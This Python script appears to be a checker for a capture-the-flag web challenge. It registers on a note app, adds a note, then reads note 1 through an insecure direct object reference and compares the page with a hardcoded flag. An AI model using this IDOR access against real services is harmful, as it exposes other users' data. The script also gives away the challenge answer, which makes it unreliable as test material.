from requests import *
import utils


def check(host):
    s = session()
    # reg
    result = s.post(f"http://na1.{host}/", data={
        "username": utils.randomString(),
        "password": "9pFrqCEyagsCbabGamT"
    }).content
    if b"Welcome to our super-duper safe note app!" not in result:
        return 0, "Failed to login"

    # add note
    result = s.post(f"http://na1.{host}/add_note", data={
        "content": "123"
    }).content
    if b"Note ID: " not in result:
        return 0, "Wrong result of add note"

    # idor
    result = s.get(f"http://na1.{host}/note/1").content
    if b'we{7b9f9649-9226-4027-92cc-53d192efa414@H0w-1-Cee-CLasSmaTe8-sc0Res}' not in result:
        return 0, "Failed to get flag"
    return 1, ""

FUNCTIONS = [check]


if __name__ == "__main__":
    print(check("w-va.cf"))

